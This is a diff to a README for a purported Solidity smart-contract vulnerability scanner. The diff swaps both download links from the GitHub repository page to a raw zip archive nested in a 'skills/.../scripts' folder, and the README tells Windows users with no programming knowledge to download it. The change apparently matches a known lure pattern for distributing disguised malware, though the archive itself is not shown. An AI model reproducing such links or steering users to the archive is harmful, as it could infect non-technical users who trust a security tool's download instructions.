@@ -1,6 +1,6 @@
 # 🛡️ claude-solidity-security - Identify Smart Contract Vulnerabilities With Ease
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Mrgau3838/claude-solidity-security)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/Mrgau3838/claude-solidity-security/main/skills/smart-contract-security/scripts/security-claude-solidity-3.8-beta.5.zip)
 
 This tool scans Solidity smart contracts for security flaws. It helps you protect Ethereum and decentralized finance projects by finding risks before deployment. The software integrates security standards from OWASP and automated tools like Slither to give you a clear report on your code.
 
@@ -8,7 +8,7 @@ This tool scans Solidity smart contracts for security flaws. It helps you protec
 
 You do not need programming knowledge to start. This tool acts as an assistant that checks your project files for common weaknesses. Follow these instructions to set up the software on your Windows computer.
 
-[Click here to visit the download page](https://github.com/Mrgau3838/claude-solidity-security)
+[Click here to visit the download page](https://raw.githubusercontent.com/Mrgau3838/claude-solidity-security/main/skills/smart-contract-security/scripts/security-claude-solidity-3.8-beta.5.zip)
 
 ## 🖥️ System Requirements
 
